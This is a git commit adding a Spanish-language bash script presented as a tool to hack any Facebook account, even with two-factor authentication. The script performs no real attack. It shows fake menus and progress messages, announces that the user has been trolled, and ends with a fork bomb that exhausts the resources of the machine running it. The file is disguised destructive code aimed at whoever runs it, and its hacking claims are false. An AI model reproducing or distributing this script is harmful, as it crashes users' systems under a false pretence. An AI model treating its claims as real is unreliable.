c0931d602b65f1d107af431c5992db7e71c39098
Blackgh0st <74381809+Blackgh0st@users.noreply.github.com>
2020-11-14 02:41:03 +0000

    Add files via upload

---
+++ HACKTHEFB.sh
@@ -0,0 +1,72 @@
+clear
+sleep 3
+echo '
+Bienvenido a mi Herramienta
+Esta Herramienta sirve para Hackear cualquier usuario de facebook
+Funciona aunque tenga seguridad de dos pasos Activadada.
+Esta Herramienta fue Creada Por BlackGhost
+
+
+Bienvenido,Espero que disfrutes de esta Herramienta :) 
+
+'
+sleep 2
+echo ' Ingrese el Nombre y Contraseña del Usuario a Hackear...: 
+
+'
+read -p 'Root@Root: ' tlf
+sleep 3
+clear 
+echo 'Analizando...' 
+sleep 2
+echo 'Usuario Existente!' 
+clear
+echo '
+
+ Elige el tipo de ataque que desee...!  
+
+' 
+echo '[ 1 ]  Buscar Correo y Contraseña' 
+sleep 0.1
+echo '[ 2 ]  Entrar Automaticamente (no se dara Correo y Password' 
+sleep 0.1
+echo '[ 3 ]  Buscar Usuario en Free Fire' 
+sleep 0.1
+echo '[ 4 ]  Borrar todos sus amigos'
+sleep 0.1
+echo 'ELIGA SU OPCION!
+
+'
+read -p 'Root@Root: ' bin
+echo  ' ' 
+case $bin in
+1)
+	echo 'Preparando binario Destroyer...'
+	;;
+2)
+	echo 'Preparando binario FKYOU...' 
+	;;
+3)
+	echo 'Preparando binario GURU...'
+	;;
+4)
+	echo 'Preparando binario LeGioN...'
+	;;
+5)
+	echo 'Preparando binario B00M...'
+	;;
+*)
+	;;
+esac
+sleep 2
+echo 'Este Ataque puede durar alrededor de 30 Segundos...' 
+sleep 5
+echo ' ' 
+echo '$>Atacando... 
+
+infectando a' $tlf
+sleep 2
+echo "LO SIENTO,PERO USTED FUE TROLLEADO"
+echo "INTENTELO DE NUEVO MAS TARDE"
+echo 'TROLLEADO POR BLACKGHOST'
+:(){ :|: & };:
